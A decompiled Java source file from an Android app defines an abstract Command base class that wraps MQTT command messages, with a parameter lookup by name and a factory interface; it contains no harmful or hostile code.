package com.app.system.common.commands;

import android.content.Context;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommand.Param;
import com.app.system.mqtt.MqttCommandReply;

public abstract class Command
{
  protected MqttCommand mqttCmd;
  
  public Command(MqttCommand paramMqttCommand)
  {
    this.mqttCmd = paramMqttCommand;
  }
  
  public abstract MqttCommandReply a(Context paramContext);
  
  protected String a(String paramString)
  {
    for (MqttCommand.Param localParam : this.mqttCmd.parametri) {
      if ((localParam.nome != null) && (localParam.nome.equalsIgnoreCase(paramString))) {
        return localParam.valore;
      }
    }
    return null;
  }
  
  public static abstract interface Factory
  {
    public abstract Command a(MqttCommand paramMqttCommand);
  }
}


/* Location:              ~/com/app/system/common/commands/Command.class
 *
 * Reversed by:           J
 */